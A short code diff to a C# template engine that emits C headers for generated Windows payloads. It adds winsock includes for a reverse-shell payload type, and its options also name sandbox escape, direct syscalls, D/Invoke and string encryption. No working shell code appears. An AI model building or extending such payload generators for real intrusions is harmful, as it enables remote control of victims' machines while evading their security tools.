@@ -278,6 +278,17 @@ public static class TemplateEngine
         sb.AppendLine("#include <windows.h>");
         sb.AppendLine("#include <stdio.h>");
         if (config.Payload == PayloadType.SandboxEscape) sb.AppendLine("#include <tlhelp32.h>");
+        if (config.Payload == PayloadType.ReverseShell)
+        {
+            // winsock2.h MUST precede windows.h in many SDKs, but MinGW's <windows.h>
+            // already excludes the old winsock1 bits when WIN32_LEAN_AND_MEAN is set
+            // OR when winsock2.h is the first/only socket header pulled. Including
+            // it after <windows.h> here works on MinGW because the canonical guard
+            // (_WINSOCKAPI_) hasn't been triggered yet — neither <windows.h> nor
+            // <stdio.h> pull winsock1 by default on MinGW.
+            sb.AppendLine("#include <winsock2.h>");
+            sb.AppendLine("#include <ws2tcpip.h>");
+        }
         if (config.DInvoke) sb.AppendLine("#include \"dinvoke.h\"");
         if (config.DirectSyscalls) sb.AppendLine("#include \"syscalls.h\"");
         if (config.EncryptStrings) sb.AppendLine("#include \"cryptor.h\"");
